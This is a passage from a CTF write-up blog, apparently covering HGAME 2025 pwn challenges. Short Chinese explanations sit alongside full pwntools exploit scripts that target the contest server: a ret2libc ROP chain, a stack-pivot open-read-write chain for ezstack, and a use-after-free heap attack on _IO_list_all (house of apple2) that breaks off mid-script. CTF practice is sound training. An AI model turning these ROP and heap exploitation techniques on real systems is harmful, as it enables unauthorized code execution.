class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,30656)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;\nHow many flowers have you prepared this time?&quot;)</span><br><span class="line">sl(str(16))</span><br><span class="line"></span><br><span class="line">rl(&quot;\nTell me the number of petals in each flower.&quot;)</span><br><span class="line">for i in range(14):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(i+1))</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(15))</span><br><span class="line"></span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(0x0000001000000015))</span><br><span class="line">for i in range(5):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(b&#x27;-&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line"></span><br><span class="line">for i in range(18):</span><br><span class="line">rl(&quot; + &quot;)</span><br><span class="line"></span><br><span class="line">libc_base=int(p.recv(15),10)-171408</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line"></span><br><span class="line">rl(&quot;\nHow many flowers have you prepared this time?&quot;)</span><br><span class="line">sl(str(16))</span><br><span class="line"></span><br><span class="line">rl(&quot;\nTell me the number of petals in each flower.&quot;)</span><br><span class="line">for i in range(14):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(i+1))</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(15))</span><br><span class="line"></span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(0x0000001000000016))</span><br><span class="line">for i in range(2):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(b&#x27;-&#x27;)</span><br><span class="line"></span><br><span class="line">def pay(a):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(a))</span><br><span class="line">pay(rdi)</span><br><span class="line">pay(bin_sh)</span><br><span class="line">pay(rdi+1)</span><br><span class="line">pay(system)</span><br><span class="line"></span><br><span class="line">rl(&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="ezstack">ezstack</h4><p>webpwn</p><p>主体就是一个栈迁移，有0x10字节溢出，并且开启沙盒</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739889189440-8b981794-ea80-4176-a01d-dca3ff45e009.png" alt=""></p><p>这里给出gift，跟正常相比的就是fd位是4，最后orw的参数分别是0，5，4</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739889244487-ae479c2e-1268-4f62-a019-6f16b041373e.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;127.0.0.1&#x27;,9999)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31421)</span><br><span class="line">rdi=0x0000000000401713</span><br><span class="line">rsi_r15=0x0000000000401711</span><br><span class="line">bss=0x404154</span><br><span class="line">read=0x40140F</span><br><span class="line">leave_ret=0x401426</span><br><span class="line">rbp=0x000000000040135d</span><br><span class="line"></span><br><span class="line">rl(&quot;Good luck.\n&quot;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x50)+p64(bss)+p64(read)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line">sleep(0.01)</span><br><span class="line">pay2 =(p64(rsi_r15)+p64(elf.got[&#x27;read&#x27;])*2+p64(elf.plt[&#x27;write&#x27;])+p64(0x4013D2)).ljust(0x50,b&#x27;\x00&#x27;)</span><br><span class="line">pay2+=p64(0x404104-8)+p64(leave_ret)  </span><br><span class="line">#bug()</span><br><span class="line">s(pay2)</span><br><span class="line"></span><br><span class="line">libc_base=get_addr64()-libc.sym[&#x27;read&#x27;]</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">mprotect=libc_base + libc.sym[&#x27;mprotect&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Good luck.\n&quot;)</span><br><span class="line">pay3=(p64(rsi)+p64(0x404530)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(0x4013D2)+b&#x27;/flag\x00\x00\x00&#x27;).ljust(0x50,b&#x27;\x00&#x27;)+p64(0x4040dc-8)+p64(leave_ret)</span><br><span class="line">#bug()</span><br><span class="line">s(pay3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">flag=0x404530</span><br><span class="line">stack=0x404130+0x500</span><br><span class="line">orw = b&#x27;/flag\x00\x00\x00&#x27;+p64(rdi) + p64(flag)  #/flag的字符串位置，要改</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(5)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #读入flag的位置</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(4)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #读入flag的位置</span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x50)+p64(0x404530)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">pay3=(p64(rsi)+p64(bss)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(bss)).ljust(0x50,b&#x27;\x00&#x27;)+p64(0x4040d4-8)+p64(leave_ret)</span><br><span class="line">bug()</span><br><span class="line">s(pay3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">flag=0x40420c</span><br><span class="line">stack=0x404130+0x500</span><br><span class="line">orw = p64(rdi) + p64(flag)  #/flag的字符串位置，要改</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #读入flag的位置</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #读入flag的位置</span><br><span class="line">orw += p64(write)+b&#x27;/flag\x00\x00\x00&#x27;</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="week2">week2</h3><h4 id="Hit-list">Hit list</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885361131-33186b5c-db0e-40ce-9e3c-267086d332f2.png" alt=""></p><p>add</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885486359-3b37c093-c360-4c0c-9ff7-7708bb2258df.png" alt=""></p><p>edit</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885533118-d0e39e18-15e9-4447-b26a-898efb9b5992.png" alt=""></p><p>gift</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885409779-7bcccd44-5ef0-48f8-a84e-ad64ab8650b3.png" alt=""></p><p>典菜单堆题，漏洞点uaf</p><p>add限制堆块大小&lt;=0x3f0，这样就不能进行largerbin attack了，每次申请堆块会申请0x20的信息堆块</p><p>同时给出gift，可以任意地址free，触发条件是malloc(0)</p><p>edit是先将堆块free之后利用申请堆块的部分将堆块再次申请出来写入</p><p>首先就是泄露堆地址，申请两个共同大小的堆块，释放后申请0x20大小的堆块，就可以得到堆地址</p><p>其次是泄露libc地址，释放大于0x88的堆块，先将tcachebin添慢，中间0x30的堆块如果满的话没办法free，我们可以申请0x20的堆块再次释放，就可以拿到libc地址</p><p>最后我们申请一个大堆块，伪造好合适的size，利用gift将伪造的堆块释放，之后edit大堆块就可以完成tcachebin attack，攻击IO_list_all，写入我们伪造fake_io的堆地址，走house of apple2，exit退出触发getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,32272)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size,content):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(b&#x27;a&#x27;*7)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def edit(i,name,size,content):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(name)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">s(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(1,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(2,0x68,b&#x27;a&#x27;)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(3,0x20,b&#x27;a&#x27;*(0x10))</span><br><span class="line">show(1)</span><br><span class="line">rl(&quot;Information: aaaaaaaaaaaaaaaa&quot;)</span><br><span class="line">heap_base=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x2d0</span><br><span class="line">li(hex(heap_base))</span><br><span class="line">free(1)</span><br><span class="line">add(0,0x20,b&#x27;a&#x27;)</span><br><span class="line">add(1,0x68,b&#x27;a&#x27;)</span><br><span class="line">add(2,0x68,b&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(20):</span><br><span class="line">add(i+3,0x90,b&#x27;a&#x27;)</span><br><span class="line">for i in range(7):</span><br><span class="line">free(i+3)</span><br><span class="line">add(21,0x20,b&#x27;a&#x27;)</span><br><span class="line">free(11)</span><br><span class="line">free(13)</span><br><span class="line">add(22,0x38,b&#x27;a&#x27;)#16</span><br><span class="line">show(16)</span><br><span class="line">libc_base=get_addr64()-2207073</span><br><span class="line">li(hex(libc_base))</span><br><span class="line"></span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">IO_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]-0x10</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">add(23,0x40,b&#x27;a&#x27;)#17</span><br><span class="line">add(24,0x100,b&#x27;\x00&#x27;*0x30+p64(0x81)+b&#x27;a&#x27;*8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#add(25,-10,hex(heap_base+0x950))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(str(25))</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span class="line">sl(b&#x27;a&#x27;*7)</span><br><span class="line">rl(&quot;&gt;&quot;)</span><br><span 